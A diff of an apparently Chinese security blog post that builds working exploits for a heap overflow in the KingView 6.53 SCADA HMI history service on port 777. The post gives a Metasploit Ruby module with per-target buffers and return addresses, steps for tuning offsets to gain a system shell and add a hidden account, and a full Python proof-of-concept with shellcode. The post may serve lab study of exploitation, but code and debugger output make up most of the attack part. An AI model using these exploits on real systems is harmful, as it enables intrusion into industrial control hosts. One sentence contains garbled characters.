+            &#39;DefaultTarget&#39; =&gt; 0))
+
+            register_options( [ Opt::RPORT(777) ], self.class )
+    end
+
+    def exploit
+        sploit = &#39;&#39;
+        if target.name =~ /XP SP1/
+
+            sploit &lt;&lt; make_nops(32812)
+            sploit &lt;&lt; &quot;\xEB\x10&quot;
+            sploit &lt;&lt; &quot;\x41&quot;*6
+            sploit &lt;&lt; &quot;\xAD\xBB\xC3\x77&quot;
+            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+            sploit &lt;&lt; make_nops(8)
+            sploit &lt;&lt; payload.encoded
+            sploit &lt;&lt; &quot;\x44&quot;*(1000-payload.encoded.length)
+            #this makes the app more crashy, need to investigatev
+            #sploit &lt;&lt; make_nops(1000-payload.encoded.length) 
+
+        elsif target.name =~ /XP SP3/
+
+            sploit &lt;&lt; make_nops(1024)
+            sploit &lt;&lt; payload.encoded
+            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)
+            #rand_text_alpha_xxx() unfortunately makes it a bit unstable,
+            #not ready to implement
+            #sploit &lt;&lt; rand_text_alpha_upper(32776-sploit.length)
+            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+        elsif target.name =~ /2003 SP0/
+
+            sploit &lt;&lt; make_nops(1020)
+            sploit &lt;&lt; &quot;ABCA&quot;
+            sploit &lt;&lt; payload.encoded
+            sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)
+            sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+
+
+        end
+
+        connect
+
+        print_status(&quot;Trying target #&#123;target.name&#125;&quot;)
+        sock.write(sploit)
+
+        select(nil, nil, nil, 5)
+        handler
+        disconnect
+
+    end
+end</code></pre>
 <p>​        进入msf，重新 reaload module，可以看到新加入的目标代码已经加载。</p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z80ro7apj31g30sue82.jpg" alt="截屏2019-10-15下午7.06.12"></p>
 <p>​        这里注意，一定要更换攻击方式，由原来的1变为2.</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set target <span class="number">2</span></span><br></pre></td></tr></table></figure>
+<pre><code class="ruby">    set target 2</code></pre>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z82ue9dhj31g30suqv5.jpg" alt="截屏2019-10-15下午8.04.47"></p>
 <p>​        再次攻击后，在memory中查找定位字符串位置 ABCA，如下图所示。（图中为我第一次设置的标志值ABCD，方法相同）</p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z846kebnj31g30suwht.jpg" alt="截屏2019-10-15下午7.29.11"></p>
 <p>​        可以看到“ABCA”字符串在地址 0x00CD04C0 位置，并且䏰ᰡyload需要在此基础上加4个字节，其实位置在 0x00CD04C4。</p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z8551rqjj31g30su0w1.jpg" alt="截屏2019-10-15下午8.08.37"></p>
 <p>​        需根据上步骤定位出的 shellcode 位置来调整 Ret 的值，使得 eax + 0xC 指向输入数据包中的某个 4 字节数据。定位字符“ABCA”位 置是 0x00CD04C0，减去 0xC 得到 eax 寄存器的值为 0x00CD04C4，所以 Ret 的值为 0x00CD04C4。修改后的利用程序代码如下所示:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elsif</span> target.name =~ <span class="regexp">/2003 SP0/</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		sploit &lt;&lt; make_nops(<span class="number">1020</span>)</span><br><span class="line">		sploit &lt;&lt; <span class="string">&quot;\xC4\x04\xB4\x00&quot;</span></span><br><span class="line">		sploit &lt;&lt; payload.encoded</span><br><span class="line">		sploit &lt;&lt; <span class="string">&quot;\x44&quot;</span>*(<span class="number">31752</span>-payload.encoded.length)</span><br><span class="line">		sploit &lt;&lt; [target.ret].pack(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<pre><code class="ruby">elsif target.name =~ /2003 SP0/
+
+
+        sploit &lt;&lt; make_nops(1020)
+        sploit &lt;&lt; &quot;\xC4\x04\xB4\x00&quot;
+        sploit &lt;&lt; payload.encoded
+        sploit &lt;&lt; &quot;\x44&quot;*(31752-payload.encoded.length)
+        sploit &lt;&lt; [target.ret].pack(&#39;V&#39;)
+
+
+end</code></pre>
 <p>​        再次利用可成功通过漏洞获取系统权限。</p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7z89ajgtjj31g30su4qq.jpg" alt="截屏2019-10-15下午8.31.37"></p>
 <h2 id="预期结果"><a href="#预期结果" class="headerlink" title="预期结果"></a><strong>预期结果</strong></h2><p>​        成功获取win 2003 操作员站的shell，并可以在操作员站建立隐蔽账号。</p>
 <h2 id="PLUS"><a href="#PLUS" class="headerlink" title="PLUS"></a>PLUS</h2><p>​        尝试通过Python脚本的方式进行 EXP 编写进行手工测试。</p>
 <p>​        下面给出一个参考：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC</span></span><br><span class="line"><span class="comment">## Date: 9/28/2010</span></span><br><span class="line"><span class="comment">## Author: Dillon Beresford</span></span><br><span class="line"><span class="comment">## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar</span></span><br><span class="line"><span class="comment">## Version: 6.53 (English)</span></span><br><span class="line"><span class="comment">## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.</span></span><br><span class="line"><span class="comment">## Thanks to all who share knowledge about heap smashing and heap bypass techniques.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.</span></span><br><span class="line"><span class="comment">## No patch or response from vendor as of 1/9/2011</span></span><br><span class="line"><span class="comment">## Lets get this into the wild and see how long it takes them to respond.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Looks like persistence pays off. :-)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).</span></span><br><span class="line"><span class="comment">## Vendor: Beijing WellinControl Technology Development Co.,Ltd </span></span><br><span class="line"><span class="comment">## http://www.wellintek.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM</span></span><br><span class="line"><span class="comment">## I have made every attempt and yet they choose to ignore...</span></span><br><span class="line"><span class="comment">## This PoC should wake up the dragon. &gt;:-]</span></span><br><span class="line"><span class="comment">## With more to come!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## KingView software is a high-pormance production which can be used to building a data information </span></span><br><span class="line"><span class="comment">## service platform in automatic field. KingView software can provid graphic visualization which takes </span></span><br><span class="line"><span class="comment">## your operations management, control and optimization . KingView is widely used in power, </span></span><br><span class="line"><span class="comment">## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. </span></span><br><span class="line"><span class="comment">## And now KingView software is used in national defense, Aero-Space in China. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Notes: The HistorySrv process listens on TCP port 777 </span></span><br><span class="line"><span class="comment">## This process does not require any authentication from clients</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Windows XP SP1 (x86) </span></span><br><span class="line"><span class="comment">## CommandLine: &quot;C:\Program Files\Kingview\HistorySvr.exe&quot;</span></span><br><span class="line"><span class="comment">## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48</span></span><br><span class="line"><span class="comment">## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc</span></span><br><span class="line"><span class="comment">## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span></span><br><span class="line"><span class="comment">## ntdll!DbgBreakPoint:</span></span><br><span class="line"><span class="comment">## 77f767cd cc              int     3</span></span><br><span class="line"><span class="comment">## 0:000&gt; g</span></span><br><span class="line"><span class="comment">## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll</span></span><br><span class="line"><span class="comment">## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll</span></span><br><span class="line"><span class="comment">## (318.6d4): Access violation - code c0000005 (first chance)</span></span><br><span class="line"><span class="comment">## First chance exceptions are reported before any exception handling.</span></span><br><span class="line"><span class="comment">## This exception may be expected and handled.</span></span><br><span class="line"><span class="comment">## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000</span></span><br><span class="line"><span class="comment">## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc</span></span><br><span class="line"><span class="comment">## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246</span></span><br><span class="line"><span class="comment">## ntdll!RtlAllocateHeapSlowly+0x6bd:</span></span><br><span class="line"><span class="comment">## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????</span></span><br><span class="line"><span class="comment">## 0:000&gt; u</span></span><br><span class="line"><span class="comment">## ntdll!RtlAllocateHeapSlowly+0x6bd:</span></span><br><span class="line"><span class="comment">## 77f6256f 8901            mov     dword ptr [ecx],eax</span></span><br><span class="line"><span class="comment">## 77f62571 894804          mov     dword ptr [eax+4],ecx</span></span><br><span class="line"><span class="comment">## 77f62574 3bc1            cmp     eax,ecx</span></span><br><span class="line"><span class="comment">## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)</span></span><br><span class="line"><span class="comment">## 77f62578 668b06          mov     ax,word ptr [esi]</span></span><br><span class="line"><span class="comment">## 77f6257b 663d8000        cmp     ax,80h</span></span><br><span class="line"><span class="comment">## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)</span></span><br><span class="line"><span class="comment">## 77f62581 0fb7c8          movzx   ecx,ax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## usage python exploit.py 127.0.0.1 777</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot; KingView 6.53 SCADA HMI Heap Smashing Exploit &quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot; Credits: D1N | twitter.com/D1N &quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x80\xc2\x77&quot;</span> </span><br><span class="line"><span class="string">&quot;\xFF\xD1\x90\x90&quot;</span>) </span><br><span class="line"></span><br><span class="line">exploit = (<span class="string">&quot;\x90&quot;</span> * <span class="number">1024</span> + <span class="string">&quot;\x44&quot;</span> * <span class="number">31788</span>) </span><br><span class="line">exploit += (<span class="string">&quot;\xeb\x14&quot;</span>) <span class="comment"># our JMP (over the junk and into nops) </span></span><br><span class="line">exploit += (<span class="string">&quot;\x44&quot;</span> * <span class="number">6</span>) </span><br><span class="line">exploit += (<span class="string">&quot;\xad\xbb\xc3\x77&quot;</span>) <span class="comment"># ECX 0x77C3BBAD --&gt; call dword ptr ds:[EDI+74] </span></span><br><span class="line">exploit += (<span class="string">&quot;\xb4\x73\xed\x77&quot;</span>) <span class="comment"># EAX 0x77ED73B4 --&gt; UnhandledExceptionFilter() </span></span><br><span class="line">exploit += (<span class="string">&quot;\x90&quot;</span> * <span class="number">21</span>) </span><br><span class="line">exploit += shellcode</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;  [+] Herrow Sweeping Dragon...&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;  [+] Sending payload...&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">s.connect((host,port)) </span><br><span class="line">s.send(exploit)  </span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;  [+] Closing connection..&quot;</span> </span><br><span class="line">s.close()  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;  [+] Done!&quot;</span> </span><br></pre></td></tr></table></figure>
+<pre><code class="python">## Exploit Title: KingView 6.53 SCADA HMI Heap Overflow PoC
+## Date: 9/28/2010
+## Author: Dillon Beresford
+## Software Link: http://download.kingview.com/software/kingview%20English%20Version/kingview6.53_EN.rar
+## Version: 6.53 (English)
+## Tested on: Windows XP SP1 ( works on SP2 and SP3 ) will release new targets after CERT advisory is public. 
+
+## Shouts to HD Moore JDuck, Egyp7, todb, |)ruid, nate and the rest of the AHA! crew.
+## Thanks to all who share knowledge about heap smashing and heap bypass techniques.
+
+## Notified CERT and the vendor, CERT notified the vendor as well, vendor never responded.
+## No patch or response from vendor as of 1/9/2011
+## Lets get this into the wild and see how long it takes them to respond.
+
+## Looks like persistence pays off. :-)
+
+## SP2/SP3 targets will be available soon. (putting into metasploit this is just a poc to get response from vendor).
+## Vendor: Beijing WellinControl Technology Development Co.,Ltd 
+## http://www.wellintek.com
+
+## Beijing WellinControl Technology Development and CHINA CERT were notified on Tue, Sep 28, 2010 at 6:31 AM
+## I have made every attempt and yet they choose to ignore...
+## This PoC should wake up the dragon. &gt;:-]
+## With more to come!
+
+## KingView software is a high-pormance production which can be used to building a data information 
+## service platform in automatic field. KingView software can provid graphic visualization which takes 
+## your operations management, control and optimization . KingView is widely used in power, 
+## water conservancy,buildings, coalmine, environmental protection, metallurgy and so on. 
+## And now KingView software is used in national defense, Aero-Space in China. 
+
+## Notes: The HistorySrv process listens on TCP port 777 
+## This process does not require any authentication from clients
+
+## An attacker could replace the Flink and Blink pointers with evil ones.. Herrow srweeping dragon. 
+
+## Windows XP SP1 (x86) 
+## CommandLine: &quot;C:\Program Files\Kingview\HistorySvr.exe&quot;
+## eax=00241eb4 ebx=7ffdf000 ecx=00000003 edx=77f6eb08 esi=00241eb4 edi=00241f48
+## eip=77f767cd esp=0012fb38 ebp=0012fc2c iopl=0         nv up ei pl nz na po nc
+## cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+## ntdll!DbgBreakPoint:
+## 77f767cd cc              int     3
+## 0:000&gt; g
+## ModLoad: 71950000 71a34000   C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.10.0_x-ww_f7fb5805\comctl32.dll
+## ModLoad: 5ad70000 5ada4000   C:\WINDOWS\System32\uxtheme.dll
+## ModLoad: 71a50000 71a8b000   C:\WINDOWS\system32\mswsock.dll
+## ModLoad: 71a90000 71a98000   C:\WINDOWS\System32\wshtcpip.dll
+## (318.6d4): Access violation - code c0000005 (first chance)
+## First chance exceptions are reported before any exception handling.
+## This exception may be expected and handled.
+## eax=42424242 ebx=00000285 ecx=44444444 edx=00d38110 esi=00d38110 edi=003a0000
+## eip=77f6256f esp=0012f36c ebp=0012f584 iopl=0         nv up ei pl zr na pe nc
+## cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010246
+## ntdll!RtlAllocateHeapSlowly+0x6bd:
+## 77f6256f 8901            mov     dword ptr [ecx],eax  ds:0023:44444444=????????
+## 0:000&gt; u
+## ntdll!RtlAllocateHeapSlowly+0x6bd:
+## 77f6256f 8901            mov     dword ptr [ecx],eax
+## 77f62571 894804          mov     dword ptr [eax+4],ecx
+## 77f62574 3bc1            cmp     eax,ecx
+## 77f62576 7534            jne     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
+## 77f62578 668b06          mov     ax,word ptr [esi]
+## 77f6257b 663d8000        cmp     ax,80h
+## 77f6257f 732b            jae     ntdll!RtlAllocateHeapSlowly+0x6fa (77f625ac)
+## 77f62581 0fb7c8          movzx   ecx,ax
+
+
+## usage python exploit.py 127.0.0.1 777
+
+import os
+import socket
+import sys
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+print &quot; KingView 6.53 SCADA HMI Heap Smashing Exploit &quot;
+print &quot; Credits: D1N | twitter.com/D1N &quot;
+
+shellcode = (&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;
+&quot;\x44\x80\xc2\x77&quot; 
+&quot;\xFF\xD1\x90\x90&quot;) 
+
+exploit = (&quot;\x90&quot; * 1024 + &quot;\x44&quot; * 31788) 
+exploit += (&quot;\xeb\x14&quot;) # our JMP (over the junk and into nops) 
+exploit += (&quot;\x44&quot; * 6) 
+exploit += (&quot;\xad\xbb\xc3\x77&quot;) # ECX 0x77C3BBAD --&gt; call dword ptr ds:[EDI+74] 
+exploit += (&quot;\xb4\x73\xed\x77&quot;) # EAX 0x77ED73B4 --&gt; UnhandledExceptionFilter() 
+exploit += (&quot;\x90&quot; * 21) 
+exploit += shellcode
+
+print &quot;  [+] Herrow Sweeping Dragon...&quot;
+print &quot;  [+] Sending payload...&quot;
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+s.connect((host,port)) 
+s.send(exploit)  
+data = s.recv(1024)
+
+print &quot;  [+] Closing connection..&quot; 
+s.close()  
+print &quot;  [+] Done!&quot; </code></pre>
 </article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2019/10/26/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7/" title="常见二进制逆向工具总结"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">上一页: 常见二进制逆向工具总结</span></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/haojen"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> Fstark 2021</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>
